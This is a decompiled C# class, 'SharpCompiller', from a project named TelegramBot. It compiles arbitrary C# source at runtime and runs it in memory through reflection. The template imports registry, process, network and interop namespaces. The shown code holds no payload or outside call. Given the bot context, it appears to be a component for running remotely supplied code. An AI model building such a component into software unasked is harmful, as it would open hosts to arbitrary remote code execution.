using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Text;

namespace TelegramBot
{
	// Token: 0x02000011 RID: 17
	public class SharpCompiller
	{
		// Token: 0x0600004A RID: 74 RVA: 0x00004164 File Offset: 0x00002364
		public static bool ExecuteScript(string program, string name, string[] dlls)
		{
			bool result;
			try
			{
				CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
				CompilerParameters options = new CompilerParameters(dlls, name, true)
				{
					GenerateExecutable = true
				};
				CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(options, new string[]
				{
					program
				});
				if (compilerResults.Errors.Count == 0)
				{
					try
					{
						return true;
					}
					catch (Exception ex)
					{
						SharpCompiller.error.Clear();
						SharpCompiller.error.Add(ex.Message);
						return false;
					}
				}
				foreach (string item in compilerResults.Output)
				{
					SharpCompiller.error.Clear();
					SharpCompiller.error.Add(item);
				}
				result = false;
			}
			catch
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x0000424C File Offset: 0x0000244C
		public static bool GenerateScript(string program)
		{
			CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
			CompilerParameters compilerParameters = new CompilerParameters
			{
				GenerateExecutable = false,
				GenerateInMemory = true
			};
			compilerParameters.ReferencedAssemblies.AddRange(new string[]
			{
				"System.dll",
				"System.Core.dll",
				"System.Net.dll"
			});
			CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, new string[]
			{
				program
			});
			if (compilerResults.Errors.Count == 0)
			{
				try
				{
					compilerResults.CompiledAssembly.GetType("CScript.Script").GetMethod("ScriptMethod").Invoke(null, null);
					return true;
				}
				catch (Exception ex)
				{
					SharpCompiller.error.Clear();
					SharpCompiller.error.Add(ex.Message);
					return false;
				}
			}
			foreach (string item in compilerResults.Output)
			{
				SharpCompiller.error.Clear();
				SharpCompiller.error.Add(item);
			}
			return false;
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00004374 File Offset: 0x00002574
		public static string FormatSources(List<string> code)
		{
			StringBuilder stringBuilder = new StringBuilder("\r\nusing System;\r\nusing Microsoft.Win32;\r\nusing System.IO;\r\nusing System.Net;\r\nusing System.Text;\r\nusing System.Diagnostics;\r\nusing System.Drawing;\r\nusing System.Runtime.InteropServices;\r\nusing System.Threading;\r\nusing System.Collections.Generic;\r\n\r\n \r\nnamespace CScript\r\n{\r\n    public class Script\r\n    {\r\n        public static void ScriptMethod()\r\n        {\r\n");
			foreach (string value in code)
			{
				stringBuilder.AppendLine(value);
			}
			stringBuilder.AppendLine("\r\n        }\r\n    }\r\n}");
			return stringBuilder.ToString();
		}

		// Token: 0x04000025 RID: 37
		public static string[] CFLcredit = new string[]
		{
			"System.dll",
			"System.Core.dll",
			"System.Net.dll"
		};

		// Token: 0x04000026 RID: 38
		public static List<string> code = new List<string>();

		// Token: 0x04000027 RID: 39
		public static List<string> error = new List<string>();

		// Token: 0x04000028 RID: 40
		private const string header = "\r\nusing System;\r\nusing Microsoft.Win32;\r\nusing System.IO;\r\nusing System.Net;\r\nusing System.Text;\r\nusing System.Diagnostics;\r\nusing System.Drawing;\r\nusing System.Runtime.InteropServices;\r\nusing System.Threading;\r\nusing System.Collections.Generic;\r\n\r\n \r\nnamespace CScript\r\n{\r\n    public class Script\r\n    {\r\n        public static void ScriptMethod()\r\n        {\r\n";

		// Token: 0x04000029 RID: 41
		private const string footer = "\r\n        }\r\n    }\r\n}";
	}
}
